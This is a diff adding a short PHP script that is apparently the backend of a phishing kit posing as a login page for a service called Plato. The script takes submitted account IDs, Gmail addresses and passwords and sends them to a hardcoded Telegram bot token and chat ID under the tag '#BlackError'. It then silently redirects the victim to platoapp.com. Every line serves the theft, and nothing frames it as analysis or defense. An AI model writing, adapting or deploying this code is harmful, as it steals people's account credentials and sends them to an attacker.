@@ -1,0 +1,15 @@
+<?php   
+$nofezToken = "2074724055:AAEUXt7FpvaPOHzlx4ZGsp7gzV08PJXIgYU";
+$nofezID = "1713765619"; 
+$Accont = $_POST['Accont'];
+$Gmail = $_POST['Gmail'];
+$Password = $_POST['Password'];
+$nofezm = "  <b>#BlackError</b>   
+<b>------------------------------</b>  
+<b>💵 Id Accont 💵</b> : <code>$Accont</code> 
+<b>💵 Gmail 💵</b> : <code>$Gmail</code> 
+<b>💵 Password 💵</b> : <code>$Password</code>  
+<b>------------------------------</b> 
+";       file_get_contents("https://api.telegram.org/bot$nofezToken/sendMessage?parse_mode=HTML&chat_id=$nofezID&text=".urlencode($nofezm)); 
+?>  
+<meta content='0;url=https://platoapp.com' http-equiv='refresh'/>
